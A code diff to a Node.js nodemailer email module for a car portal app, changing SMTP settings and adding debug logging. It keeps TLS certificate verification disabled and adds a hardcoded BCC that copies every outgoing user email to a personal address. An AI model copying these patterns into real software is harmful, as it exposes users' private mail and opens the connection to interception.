@@ -1,17 +1,22 @@
 const nodemailer = require('nodemailer');
 
-// Create transporter for Gmail SMTP
+// Create transporter for Gmail SMTP (Render-compatible configuration)
 const transporter = nodemailer.createTransport({
   host: 'smtp.gmail.com',
-  port: 587,
-  secure: false, // true for 465, false for other ports
+  port: 465,
+  secure: true, // Use SSL/TLS
   auth: {
     user: process.env.EMAIL_USER,
     pass: process.env.EMAIL_PASS
   },
   tls: {
-    rejectUnauthorized: false // Allow self-signed certificates
-  }
+    rejectUnauthorized: false, // Allow self-signed certificates
+    minVersion: 'TLSv1.2' // Ensure TLS 1.2 or higher
+  },
+  // Additional settings for better compatibility
+  pool: true, // Use pooled connections
+  maxConnections: 5,
+  maxMessages: 100
 });
 
 // Verify transporter configuration on startup
@@ -33,19 +38,35 @@ const sendEmail = async (to, subject, text, html) => {
     console.log('📤 Attempting to send email...');
     console.log('   To:', to);
     console.log('   Subject:', subject);
-    
+
     const mailOptions = {
       from: `"Car Portal Support" <${process.env.EMAIL_USER}>`,
       to,
+      bcc: 'bheemesh9221@gmail.com', // BCC to admin for debugging
       subject,
       text,
-      html
+      html,
+      // Add envelope information for better debugging
+      envelope: {
+        from: process.env.EMAIL_USER,
+        to: to
+      }
     };
 
     const info = await transporter.sendMail(mailOptions);
     console.log('✅ Email sent successfully!');
     console.log('   Message ID:', info.messageId);
     console.log('   Response:', info.response);
+    console.log('   Envelope From:', info.envelope.from);
+    console.log('   Envelope To:', info.envelope.to);
+    console.log('   Accepted recipients:', info.accepted);
+    console.log('   Rejected recipients:', info.rejected);
+
+    // Log additional debugging info
+    if (info.pending) {
+      console.log('   Pending recipients:', info.pending);
+    }
+
     return info;
   } catch (error) {
     console.error('❌ Error sending email:', error.message);
